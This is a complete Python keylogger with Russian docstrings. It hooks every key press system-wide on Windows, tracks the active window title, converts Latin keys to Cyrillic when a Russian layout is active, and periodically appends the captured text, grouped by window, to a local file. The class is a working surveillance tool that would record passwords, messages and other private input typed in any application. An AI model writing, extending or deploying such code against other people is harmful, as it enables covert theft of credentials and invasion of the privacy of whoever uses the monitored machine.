import keyboard
import os
import pygetwindow as gw
from threading import Timer
from ctypes import windll

class KeyboardLogger:
    """
    Класс для логирования действий на клавиатуре
    """
    def __init__(self, save_interval=5, output_file="output.txt"):
        """
        Инициализация класса
        
        Args:
            save_interval (int): интервал сохранения текста
            output_file (str): путь к файлу для сохранения текста
        """
        self.text = ""  # записываемый текст
        script_dir = os.path.dirname(os.path.abspath(__file__))
        self.output_file = os.path.join(script_dir, output_file)
        self.save_interval = save_interval  # интервал сохранения текста
        self.timer = None  # таймер для сохранения текста
        self.is_typing = False  # флаг, показывающий, что пользователь набирает текст
        self.current_window = self.get_active_window()  # активное окно

    def get_active_window(self):
        """
        Получение активного окна
        
        Returns:
            str: заголовок активного окна
        """
        window = gw.getActiveWindow()
        if window is not None:
            return window.title
        return "Unknown"  # если окно не найдено

    def get_current_lang(self):
        """
        Получение текущего языка клавиатуры
        
        Returns:
            str: язык клавиатуры ("ru" или "en")
        """
        user32 = windll.user32
        hkl = user32.GetKeyboardLayout(user32.GetWindowThreadProcessId(user32.GetForegroundWindow(), 0))
        lid = hkl & 0xffff
        if lid == 0x0419:
            return "ru"
        return "en"

    def start_logging(self):
        """
        Запуск логирования
        """
        keyboard.on_press(self.on_key_press)
        keyboard.on_release(self.on_key_release)
        print("Начало отслеживания. Нажмите 'Esc' для выхода.")
        keyboard.wait('esc')

    def on_key_press(self, event):
        """
        Обработчик нажатия клавиши
        
        Args:
            event: объект события нажатия клавиши
        """
        if not self.is_typing:
            self.is_typing = True
            self.restart_timer()
        current_window = self.get_active_window()
        if current_window != self.current_window:
            self.save_text()
            self.current_window = current_window
        current_lang = self.get_current_lang()
        if current_lang == "ru":
            self.text += self.translate_to_russian(event.name)
        else:
            if event.name == 'space':
                self.text += ' '
            elif event.name == 'enter':
                self.text += '\n'
            elif len(event.name) == 1:
                self.text += event.name

    def translate_to_russian(self, key):
        """
        Перевод латинских символов на русские
        
        Args:
            key (str): латинский символ
        
        Returns:
            str: соответствующий русский символ
        """
        eng_to_ru = {
            'q': 'й', 'w': 'ц', 'e': 'у', 'r': 'к', 't': 'е', 'y': 'н', 'u': 'г', 'i': 'ш', 'o': 'щ', 'p': 'з', '[': 'х',
            ']': 'ъ', 'a': 'ф', 's': 'ы', 'd': 'в', 'f': 'а', 'g': 'п', 'h': 'р', 'j': 'о', 'k': 'л', 'l': 'д', ';': 'ж',
            '\'': 'э', 'z': 'я', 'x': 'ч', 'c': 'с', 'v': 'м', 'b': 'и', 'n': 'т', 'm': 'ь', ',': 'б', '.': 'ю', '/': '.'
        }
        return eng_to_ru.get(key, key)

    def on_key_release(self, event):
        """
        Обработчик отпускания клавиши
        
        Args:
            event: объект события отпускания клавиши
        """
        self.restart_timer()

    def restart_timer(self):
        """
        Перезапуск таймера сохранения текста
        """
        if self.timer:
            self.timer.cancel()
        self.timer = Timer(self.save_interval, self.save_text)
        self.timer.start()

    def save_text(self):
        """
        Сохранение текста в файл
        """
        if self.text:
            with open(self.output_file, "a", encoding="utf-8") as file:
                file.write(f"\n[{self.current_window}]\n")
                file.write(self.text)
            self.text = ""
        self.is_typing = False

if __name__ == "__main__":
    logger = KeyboardLogger(save_interval=5, output_file="output.txt")
    logger.start_logging()

